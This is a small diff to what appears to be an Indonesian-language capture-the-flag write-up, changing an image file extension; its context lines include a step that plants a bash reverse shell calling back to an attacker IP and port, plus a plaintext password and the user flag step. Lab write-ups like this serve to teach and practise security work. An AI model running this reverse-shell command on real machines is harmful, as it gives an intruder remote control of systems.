@@ -40,4 +40,4 @@ password: askira
     - memasukan code reverse shell pada target machine
     bash -c 'bash -i >& /dev/tcp/10.18.200.73/9001 0>&1'
     - mengambil flag user.txt
-    ![Alt text](images/user.png)
+    ![Alt text](images/user.jpg)
